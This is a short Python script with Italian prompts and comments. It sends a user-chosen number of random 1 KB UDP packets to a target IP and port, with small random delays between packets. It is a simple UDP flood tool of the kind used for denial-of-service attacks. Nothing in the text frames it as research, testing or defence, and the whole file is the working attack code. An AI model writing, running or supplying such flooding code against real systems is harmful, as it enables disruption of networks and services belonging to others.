import socket
import random
import time


target_ip = input("Inserisci l'IP target: ")


target_port = int(input("Inserisci la porta target: "))


num_packets = int(input("Inserisci il numero di pacchetti da 1 KB da inviare: "))


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


packet = random._urandom(1024)

print(f"Inviando {num_packets} pacchetti UDP da 1 KB a {target_ip}:{target_port}")

# Inviare il numero specificato di pacchetti con ritardo casuale tra ciascuno
for _ in range(num_packets):
    sock.sendto(packet, (target_ip, target_port))
    # Genera un ritardo casuale tra 0 e 0.1 secondi
    delay = random.uniform(0, 0.1)
    time.sleep(delay)

print("Invio pacchetti completato")

# Chiudere il socket
sock.close()